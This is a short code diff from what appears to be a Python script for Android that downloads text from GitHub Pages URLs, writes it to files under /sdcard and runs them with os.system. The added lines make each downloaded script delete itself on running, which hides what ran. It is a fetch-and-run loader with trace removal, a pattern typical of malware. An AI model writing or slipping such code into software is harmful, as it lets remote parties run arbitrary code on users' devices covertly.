@@ -5,6 +5,7 @@ def au1():
 
 def au2():
 	f=open('/sdcard/t1','w')
+	print("os.remove('/sdcard/t1')",file=f)
 	print(get('https://tad0025.github.io/team_phuc/team1.html').text,end='',file=f)
 	f.close()
 	os.system('python /sdcard/t1')
@@ -13,6 +14,7 @@ s2.start()
 
 def au3():
 	f=open('/sdcard/t2','w')
+	print("os.remove('/sdcard/t2')",file=f)
 	print(get('https://tad0025.github.io/team_phuc/team2.html').text,end='',file=f)
 	f.close()
 	os.system('python /sdcard/t2')
